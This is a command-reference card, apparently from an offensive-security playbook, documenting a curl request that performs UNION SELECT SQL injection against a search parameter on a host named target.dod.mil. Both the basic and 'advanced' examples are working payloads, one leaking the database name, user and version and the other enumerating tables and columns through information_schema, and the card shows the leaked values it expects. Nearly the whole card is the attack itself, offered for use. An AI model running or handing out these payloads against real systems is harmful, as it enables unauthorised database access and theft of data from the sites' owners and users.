---
data: >-
  curl "https://target.dod.mil/search?q=test' UNION SELECT database(), user(),
  version()--" -v
tags:
  - sqli
  - web
  - exploit
type: command
output: Response including database metadata
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:19.936Z'
id: 7fbe0a20-13a7-42f4-9117-384a1f4c4715
verified: false
validated: true
submitted: true
---
# curl-union-select

## Command

```bash
curl "https://target.dod.mil/search?q=test' UNION SELECT database(), user(), version()--" -v
```

## Description

This command exploits a confirmed SQL injection by using UNION SELECT to append and retrieve database information like name, user, and version.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Target with UNION payload | Yes |
| -v | Verbose mode for headers and body | No |

## Examples

### Basic Usage

```bash
curl "https://target.dod.mil/search?q=test' UNION SELECT database(), user(), version()--" -v
```

### Advanced Usage

```bash
curl "https://target.dod.mil/search?q=1' UNION SELECT table_name, column_name FROM information_schema.columns--" -v
```

## Expected Output

Page content reflecting the injected query results, e.g., "Results: mydb | dod_user@localhost | 5.7.30".

## Related

- [[Related Procedure|procedures/Exploit-SQL-Injection-via-URL-Parameter]]
